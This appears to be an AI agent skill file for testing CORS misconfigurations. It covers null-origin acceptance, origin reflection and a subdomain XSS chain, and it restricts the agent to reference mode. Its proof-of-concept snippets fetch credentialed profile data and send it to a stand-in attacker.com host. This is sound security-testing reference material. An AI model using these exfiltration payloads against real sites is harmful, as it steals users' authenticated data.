---
name: cors-cross-origin-misconfiguration
description: >-
  CORS misconfiguration testing playbook. Use when analyzing cross-origin trust, credentialed browser reads, origin reflection, preflight policy bugs, and browser-based access to authenticated APIs.
---

# SKILL: CORS Misconfiguration — Credentialed Origins, Reflection, and Trust Boundary Errors

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled workflow in planning and reference mode. Catalog body inspection does not authorize network interaction or state changes.
- Define an exact in-scope subject, stable baseline, one-variable test, negative control, expected evidence, and stop condition before any future activation.
- The lightweight kernel supports bounded GET/HEAD requests, file reads/searches, and explicit-port TCP connect scans only; do not emulate POST, browser, shell, or exploit operations.
- Separate a candidate hypothesis from a verified finding and cite Evidence IDs.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Use this skill when browsers can access authenticated APIs cross-origin. Focus on reflected origins, credentialed requests, wildcard trust, parser mistakes, and origin allowlist bypasses. For JSONP hijacking deep dives, same-origin policy internals, honeypot de-anonymization, and CORS vs JSONP comparison, inspect the companion [SCENARIOS.md](./SCENARIOS.md).

### Extended Scenarios

Also inspect [SCENARIOS.md](./SCENARIOS.md) when you need:
- JSONP hijacking complete attack scenario — watering hole + `<script>` cross-origin data theft
- Honeypot de-anonymization via JSONP — use social platform JSONP endpoints to identify anonymous visitors
- Same-origin policy deep dive — protocol/hostname/port definition, `document.domain` subdomain relaxation and its security risks
- CORS vs JSONP technical comparison — methods, error handling, credential behavior, migration path
- CORS exploitation payloads — reflected origin with `credentials: include`, null origin via sandboxed iframe
- Dual-site attack lab pattern — localhost:8981 (target) + localhost:8982 (attacker) testing setup

## 1. WHEN THIS SKILL APPLIES
Use this workflow when:
- Responses contain `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, or preflight headers
- A browser-based attack path might read authenticated API responses
- JSON endpoints appear protected from CSRF but are readable cross-origin

## 2. HIGH-VALUE MISCONFIGURATION CHECKS

| Theme | What to Check |
|---|---|
| wildcard with credentials | `Access-Control-Allow-Origin: *` plus credential support or equivalent broken behavior |
| reflected origin | server echoes arbitrary `Origin` |
| weak allowlist | suffix, prefix, substring, regex, or mixed-case matching errors |
| `null` origin | acceptance of sandboxed, file, or serialized origins |
| preflight trust | overbroad methods and headers |
| internal API exposure | admin or tenant data readable cross-origin |

## 3. QUICK TRIAGE

1. Send crafted `Origin` headers and inspect reflection.
2. Test with and without credentials.
3. Probe allowlist bypasses using attacker subdomains and parser edge cases.
4. If readable data is sensitive, chain to account or tenant impact.

## 4. RELATED ROUTES

- Session or JSON action abuse: `csrf-cross-site-request-forgery`
- OAuth token leakage and callback binding: `oauth-oidc-misconfiguration`
- API auth context: `api-auth-and-jwt-abuse`

---

## 5. NULL ORIGIN EXPLOITATION

### How `Origin: null` is sent

| Context | Origin Header Value |
|---------|-------------------|
| Sandboxed iframe (`<iframe sandbox>`) | `null` |
| `data:` URI scheme | `null` |
| `file:` protocol (local HTML) | `null` |
| Cross-origin redirect chain (some browsers) | `null` |
| Serialized data in `blob:` URL from opaque origin | `null` |

### Exploitation

If the server includes `null` in its origin allowlist or reflects it:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

```html
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
fetch('https://target.com/api/user/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(d))));
</script>
"></iframe>
```

The sandboxed iframe sends `Origin: null` → server reflects `null` → attacker reads credentialed response.

---

## 6. SUBDOMAIN XSS → CORS BYPASS CHAIN

### Attack flow

```text
1. Target API at api.target.com allows CORS from *.target.com
2. Find XSS on any subdomain: blog.target.com, dev.target.com, etc.
3. Exploit XSS to make credentialed requests to api.target.com
4. CORS allows the request → attacker reads sensitive API responses
```

### PoC (injected via XSS on blog.target.com)

```javascript
fetch('https://api.target.com/v1/user/profile', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    navigator.sendBeacon('https://attacker.com/exfil',
        JSON.stringify(data));
});
```

### Why this works

- `blog.target.com` is **same-site** with `api.target.com` → `SameSite` cookies sent
- CORS allowlist includes `*.target.com` → `Access-Control-Allow-Origin: https://blog.target.com`
- Combined: SameSite bypass + CORS read = full API access from XSS on any subdomain

### Reconnaissance for this chain

```text
□ Enumerate subdomains (amass, subfinder, crt.sh)
□ Test each for XSS (stored, reflected, DOM)
□ Check if API CORS accepts subdomain origins
□ Subdomain takeover candidates also qualify
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 7. VARY: ORIGIN CACHING ISSUE
- 8. REGEX BYPASS PATTERNS
- 9. INTERNAL NETWORK CORS EXPLOITATION
